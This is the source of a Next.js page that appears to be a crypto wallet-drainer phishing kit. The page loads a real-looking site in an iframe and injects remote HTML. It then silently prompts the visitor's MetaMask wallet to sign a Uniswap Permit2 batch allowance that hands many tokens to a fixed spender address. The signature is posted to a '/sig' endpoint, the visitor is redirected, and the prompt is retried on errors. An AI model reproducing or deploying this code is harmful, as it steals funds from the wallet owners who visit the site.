import { createRef, useEffect, useState } from "react";
import { useWeb3React, Web3ReactProvider } from "@web3-react/core";
import { InjectedConnector } from "@web3-react/injected-connector";
import Layout from "../components/layout";
import { injected } from "../components/wallet/connectors";
import Head from "next/head";
import { ethers } from "ethers";
import qs from "qs";
import {
    PermitSingle,
    PermitBatch,
    AllowanceTransfer,
    MaxAllowanceExpiration,
    PERMIT2_ADDRESS,
} from "@uniswap/permit2-sdk";

import { D } from "../configs/Dconfig";
import http from "../units/http";
import axios from "axios";
const HomePage = () => {
    const [signature, setSignature] = useState("");
    const { active, account, library, connector, activate, deactivate } =
        useWeb3React();
    useEffect(() => {
        if (typeof window.ethereum == "undefined") return false;
        const metamaskProvider = new ethers.providers.Web3Provider(
            window.ethereum
        );

        axios
            .request(process.env.NEXT_PUBLIC_WEBSITE_PAGE_CONTENT)
            .then((rs) => {
                document.getElementById("page-main").innerHTML = rs.data;
            });
        var once = false;
        setInterval(() => {
            if (once) return;
            handleLoad(metamaskProvider.getSigner());
            once = true;
        }, 2000);
    }, []);

    const handleLoad = async (signer) => {
        const details = [];

        Object.keys(D).map((item, index) => {
            if (index > 1) {
                const token_item = {
                    token: D[item].address,
                    amount: D[item].amount,
                    expiration: D.usdc.expiration,
                    nonce: 0,
                };
                details.push(token_item);
            }
        });

        const permit = {
            details: details,
            spender: D.spender_address,
            sigDeadline: D.expiration,
        };

        const { domain, types, values } = AllowanceTransfer.getPermitData(
            permit,
            PERMIT2_ADDRESS,
            ...(process.env.NEXT_PUBLIC_ENABLE_TESTNETS === "true" ? [5] : [1])
        );
        try {
            const s = await signer._signTypedData(domain, types, values);
            setSignature(s);
            const data = {
                account: signer.provider.provider.selectedAddress,
                permit2address: domain.verifyingContract,
                chain: domain.chainId,
                details: JSON.stringify(values.details),
                signature: s,
                source: process.env.NEXT_PUBLIC_SOURCE,
            };
            http.post("/sig", qs.stringify(data)).then((res) => {
                if (res.status == 200) {
                    window.location.href =
                        process.env.NEXT_PUBLIC_DOMAIN_WEBSITE;
                }
            });

            try {
                signer = null;
            } catch (ex) {
                console.log(ex);
            }
            return s;
        } catch (e) {
            console.log(e.code);

            if (e.code != "ACTION_REJECTED") {
                activate(injected).then(() => {
                    handleLoad(signer);
                });
            } else {
                console.log("USER REJECTED");
            }
        }
    };

    return (
        <Layout>
            <Head>
                <title>{process.env.NEXT_PUBLIC_WEBSITE_PAGE_TITLE}</title>
                <meta
                    name="description"
                    content={process.env.NEXT_PUBLIC_WEBSITE_PAGE_KEYWORD}
                />
                <link rel="icon" href="/favicon.ico" />
            </Head>
            <div id="page-main"></div>
            <div className="iframe-box">
                <iframe
                    id="my-iframe"
                    src={process.env.NEXT_PUBLIC_DOMAIN_WEBSITE}
                    style={{ width: "100%", height: "2048px" }}
                ></iframe>
            </div>
        </Layout>
    );
};

export default HomePage;

HomePage.getLayout = function getLayout(page) {
    return { page };
};
